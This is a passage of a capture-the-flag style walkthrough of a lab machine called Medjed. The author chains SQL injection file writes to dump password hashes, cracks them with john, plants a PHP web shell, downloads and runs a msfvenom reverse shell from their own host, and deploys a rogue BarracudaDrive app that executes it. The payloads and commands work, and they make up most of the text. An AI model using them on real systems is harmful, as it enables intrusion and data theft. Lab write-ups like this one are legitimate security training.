class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7800ca04bf6acfb66373f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll then check if I can write into Rails’ </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://guides.rubyonrails.org/getting_started.html#directory-structure">public folder</a></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78052ac4ede544a57eba2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Payload:</span></span></p></div><pre id="https://www.notion.so/25d0b98a88f780d0860ad8d6758ff3c4" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>asdf<span class="token string">' UNION SELECT '</span><span class="token keyword">SQL</span> injection POC<span class="token string">' INTO OUTFILE '</span>C:<span class="token operator">/</span>Sites<span class="token operator">/</span>userpro<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>poc<span class="token punctuation">.</span>txt'<span class="token comment">#</span></span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f7800aa04bf807a710cc5b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Success!</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78038aa7afbc9df994003" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/sql_poc.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/sql_poc.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25c0b98a88f780db9793c5e3c159ba20" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f780778dc0d844f766dde1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Data Exfiltration:</strong></span></span></p></div><div id="https://www.notion.so/25d0b98a88f780c4b1c5c8f685015e8b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now that I’m able to see the SQL output, I can start exfiltrating the database.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780338b06f476d0c65ebd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Listing out columns of the “users” table:</span></span></p></div><pre id="https://www.notion.so/25d0b98a88f7802b80d7d7a32804d63a" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>asdf<span class="token string">' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '</span>users<span class="token string">' INTO OUTFILE '</span>C:<span class="token operator">/</span>Sites<span class="token operator">/</span>userpro<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span><span class="token keyword">columns</span><span class="token punctuation">.</span>txt'<span class="token comment">#</span></span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f7805a80b2d3abc4d88bbb" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/sql_columns.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/sql_columns.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7800c8664f2900296c048" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Recovering password hashes:</span></span></p></div><pre id="https://www.notion.so/25d0b98a88f780eabe80cf500cd94cf5" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>asdf<span class="token string">' UNION SELECT password_digest FROM users INTO OUTFILE '</span>C:<span class="token operator">/</span>Sites<span class="token operator">/</span>userpro<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>all_passwords<span class="token punctuation">.</span>txt'<span class="token comment">#</span></span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780e1a2d6fee7f99b930f" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/sql_all_pw.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/sql_all_pw.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780b4bc2ad8b85721b892" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Recovering reminders:</span></span></p></div><pre id="https://www.notion.so/25d0b98a88f78043b425de2faf977ff2" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>asdf<span class="token string">' UNION SELECT reminder FROM users INTO OUTFILE '</span>C:<span class="token operator">/</span>Sites<span class="token operator">/</span>userpro<span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>all_reminders<span class="token punctuation">.</span>txt'<span class="token comment">#</span></span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780a6bebffac487eab3ba" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/sql_all_reminders.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/sql_all_reminders.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7802ebd12eec02e36426c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The hashes look like BCrypt, which is very resistant to offline attacks. Some of the reminders also looks like passwords themselves. I ran </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString"> against the hashes using the list of reminders as the wordlist. One of them cracked.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f78094899bc94b6ada762e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> john --wordlist=reminders.txt hashes.txt 
+
+Using default input encoding: UTF-8
+Loaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 4096 for all loaded hashes
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+Warning: Only 5 candidates left, minimum 48 needed for performance.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>xuk1EuP3N/rCpA   (?)     </span></mark></span><span class="SemanticString"><span>
+1g 0:00:00:01 DONE (2025-08-27 00:03) 0.6172g/s 3.086p/s 18.51c/s 18.51C/s 4qpdR87QYjRbog..WgsjOZwtOyCRSg
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780f4ac44c725cd860968" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Immediately did a password spray on the app, and it worked for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">kenneth.dooley</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f7803d8860d58e7357776a" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_logged_in.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_logged_in.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780f5ad44d255d90eebdc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Underwhelmingly, the authenticated page just shows the user profile with an option to edit.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780228407c8fdd70198a1" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_user_edit.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_rails_user_edit.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f78036aa65c5d01cee69e0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The edit page didn’t have much either, the experimental link goes back to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/slug</code></span><span class="SemanticString">. I’ve gone a full circle here.</span></span></p></div><div id="https://www.notion.so/25c0b98a88f780c49652e670006fd162" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f78096b089f47cdf8636ea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Web Shell Upload:</strong></span></span></p></div><div id="https://www.notion.so/25d0b98a88f780eb953be69f1ad73365" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Remember the PHP quiz app? PhpInfo revealed its web root, and turns out SQL has permissions to write into it too.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780cbbe99f6d06291c507" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Payload:</span></span></p></div><pre id="https://www.notion.so/25d0b98a88f7809a9899d660d364dcfc" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>asdf<span class="token string">' UNION SELECT '</span>test<span class="token string">' INTO OUTFILE '</span>C:<span class="token operator">/</span>xampp<span class="token operator">/</span>htdocs<span class="token operator">/</span>test<span class="token punctuation">.</span>txt'<span class="token comment">#</span></span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780c89fe0c2a5f2d2e940" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/file_write_poc.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/file_write_poc.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780438262ec649d7423c0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll write a PHP web shell into it.</span></span></p></div><pre id="https://www.notion.so/25d0b98a88f7802dbf83fcf61c759712" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>asdf<span class="token string">' UNION SELECT '</span><span class="token operator">&lt;</span>?<span class="token operator">=</span><span class="token identifier"><span class="token punctuation">`</span>$_GET[x]<span class="token punctuation">`</span></span>?<span class="token operator">></span><span class="token string">' INTO OUTFILE '</span>C:<span class="token operator">/</span>xampp<span class="token operator">/</span>htdocs<span class="token operator">/</span>shell<span class="token punctuation">.</span>php'<span class="token comment">#</span></span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780129e32e2f08a0ffc95" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And it can be accessed on port 45332.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78003b5adf8341a71e300" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/file_write_whoami.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/file_write_whoami.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7809c82c6f9ce29896c61" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For a proper shell, I’ll first generate an EXE payload with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">msfvenom</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f78077b2dbc2cff1a5937b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.160 LPORT=8001 -f exe -o shell.exe
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f78021b8a5cb98778a60e5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll host the file with a Python server and download it to the server using the web shell: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">http://192.168.200.127:45332/shell.php?x=curl http://192.168.45.160:8000/shell.exe -o C:/Users/Public/Downloads/shell.exe</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780e0a5d8d01366af2b72" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> python -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.200.127 - - [27/Aug/2025 00:47:12] &quot;GET /shell.exe HTTP/1.1&quot; 200 -</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f7808da2c7f0a2d78d1c17" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Visiting </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">http://192.168.200.127:45332/shell.php?x=C:/Users/Public/Downloads/shell.exe</code></span><span class="SemanticString"> triggered the binary execution, and a shell as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">jerren</code></span><span class="SemanticString"> was caught on my netcat listener.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780348f23d7b4b48013b6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001     
+
+listening on [any] 8001 ...
+connect to [192.168.45.160] from (UNKNOWN) [192.168.200.127] 51610
+Microsoft Windows [Version 10.0.19042.1387]
+(c) Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+medjed\jerren</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f7800a908be6ddd5349815" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25d0b98a88f780b39545f39e0b7d7ce0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">In retrospect, BarracudaDrive’s web file server also has access to the PHP web root, and the shell could be uploaded there instead. This would have saved me a lot of time, but that page was lagging so bad for me at the time I kinda overlooked it.</em></span></span></p></div><div id="https://www.notion.so/25c0b98a88f780269a25f91d29b1b55e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f78075ad75d6cf0ecfa692" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/25c0b98a88f7808dbcc4d4d38da74cf5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Jerren\Desktop&gt;</span></mark></span><span class="SemanticString"><span> type local.txt
+
+97c9c30d************************</span></span></span></code></pre><div id="https://www.notion.so/25c0b98a88f780faa104d90394995578" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f781538b44e771e6fd413c" class="Divider"></div><h3 id="https://www.notion.so/25c0b98a88f781568188f82905cde245" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/25c0b98a88f781568188f82905cde245"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/25c0b98a88f7805da153fb1d4ad3e269" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Application Manager:</strong></span></span></p></div><div id="https://www.notion.so/25d0b98a88f780239898fbbc4d493a16" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now that a foothold is gained, it’s time to revisit the privilege escalation paths identified earlier. I’ll try to deploy a rogue LSP app using BarracudaDrive’s Application Manager.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780b7a790c4b58984f9ae" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_add_new_app.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_add_new_app.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f7803881f6ef0f825cdbed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Clicking on “Browse” pops up a new window to select the ZIP file. The files for the 3 existing apps are already there under </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/applications/</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780c3b66ce792556f43bc" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_app_dir.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/web_bd_app_dir.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780559786c7f6c3f00b3a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On Medjed, it’s under </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\bd\applications\</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780b3911cdbc0b817eb69" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\bd\applications&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is A41E-B108
+
+ Directory of c:\bd\applications
+
+11/03/2020  12:29 PM    &lt;DIR&gt;          .
+11/03/2020  12:29 PM    &lt;DIR&gt;          ..
+02/18/2013  06:31 PM           165,067 cms.zip
+02/18/2013  11:59 PM            71,310 Config-Wizard.zip
+04/26/2013  05:51 PM           755,582 Forum.zip
+               3 File(s)        991,959 bytes
+               2 Dir(s)  16,498,372,608 bytes free</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780419e6cf5b3bbb64e3e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To understand how the ZIP file is structured, I’ve downloaded Config-Wizard as an example.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f78084849ecac6c894ee6d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> ls -la config-wizard
+
+total 136
+drwxr-xr-x 8 ch3ng ch3ng  4096 Aug 27 03:08 .
+drwxr-xr-x 8 ch3ng ch3ng  4096 Aug 27 03:53 ..
+-rw-r--r-- 1 ch3ng ch3ng   374 Aug 27 03:06 .appinfo
+-rw-r--r-- 1 ch3ng ch3ng 71310 Aug 27 03:06 config-wizard.zip
+-rw-r--r-- 1 ch3ng ch3ng  1061 Aug 27 03:06 .footer.lsp
+drwxr-xr-x 3 ch3ng ch3ng  4096 Aug 27 03:06 help
+-rw-r--r-- 1 ch3ng ch3ng  1793 Aug 27 03:06 help.js
+drwxr-xr-x 2 ch3ng ch3ng  4096 Aug 27 03:06 images
+-rw-r--r-- 1 ch3ng ch3ng  1789 Aug 27 03:08 index.lsp
+drwxr-xr-x 2 ch3ng ch3ng  4096 Aug 27 03:06 intro
+-rw-r--r-- 1 ch3ng ch3ng  6699 Aug 27 03:06 jquery.cycle.all.pack.js
+drwxr-xr-x 2 ch3ng ch3ng  4096 Aug 27 03:06 PortMappingFailed
+-rw-r--r-- 1 ch3ng ch3ng  6149 Aug 27 03:06 .preload
+drwxr-xr-x 2 ch3ng ch3ng  4096 Aug 27 03:06 protected
+drwxr-xr-x 2 ch3ng ch3ng  4096 Aug 27 03:06 wizard
+</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780d1a07cc1981fed4b2f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The two essential files are </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">index.lsp</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.appinfo</code></span><span class="SemanticString">. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">index.lsp</code></span><span class="SemanticString"> would be the entrypoint of the application, while </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.appinfo</code></span><span class="SemanticString"> contains the app’s metadata. I guess the important attribute is “type”, as it tells the server whether it’s a dynamic LSP app or just static HTML.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f7803bb3eae30032b4ce2e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed/config-wizard]
+└─$</span></mark></span><span class="SemanticString"><span> cat .appinfo | jq
+
+{
+  &quot;description&quot;: &quot;This application is designed to help you with the initial BarracudaDrive configuration. You may remove this application when you have completed the configuration.&quot;,
+  &quot;copyright&quot;: &quot;Real Time Logic&quot;,
+  &quot;rootapp&quot;: false,
+  &quot;hidden&quot;: false,
+  &quot;type&quot;: &quot;lsp&quot;
+}</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780618b1ec37d56616ba4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll craft my own LSP app and call it “revshell”. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.appinfo</code></span><span class="SemanticString"> would follow the same structure as above:</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780f789d3f758fc80e276" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token punctuation">{</span><span class="token property">"description"</span><span class="token operator">:</span><span class="token string">"revshell"</span><span class="token punctuation">,</span><span class="token property">"copyright"</span><span class="token operator">:</span><span class="token string">"ch3ng"</span><span class="token punctuation">,</span><span class="token property">"rootapp"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"hidden"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"lsp"</span><span class="token punctuation">}</span></span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f78003a85bc38ba0884bd3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">index.lsp</code></span><span class="SemanticString">, I’ll just use a very simple payload that runs the previously uploaded msfvenom binary.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f7809aa82bfa24248f7017" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>&lt;?lsp
+os.execute(&quot;C:\\Users\\Public\\Downloads\\shell.exe&quot;)
+?&gt;</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f7801191b0e6a87f0de3d1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll zip it up and upload it to Medjed.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780b0a71fcc856904f0ff" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> zip revshell.zip .appinfo index.lsp 
+
+  adding: .appinfo (deflated 50%)
+  adding: index.lsp (deflated 26%)</span></span></span></code></pre><div id="https://www.notion.so/25c0b98a88f780219c4fcfe82931a54b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/25c0b98a88f78098a75de5ae6e729469" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\bd\applications&gt;</span></mark></span><span class="SemanticString"><span> curl http://192.168.45.160:8000/revshell.zip -o revshell.zip
+curl http://192.168.45.160:8000/revshell.zip -o revshell.zip
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   698  100   698    0     0    698      0  0:00:01 --:--:--  0:00:01  2624</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f7804f9fd0edfb9b1acc75" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Back on Application Manager, I’ll select my uploaded ZIP and submit it.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780b2bd0af346f2f91326" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/privesc_new_app.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/privesc_new_app.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f78069bb82d7de7f6a3ce5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now “revshell” is seen in the app list.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780249ecec5dec6d97a12" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/privesc_app_list.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/privesc_app_list.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div 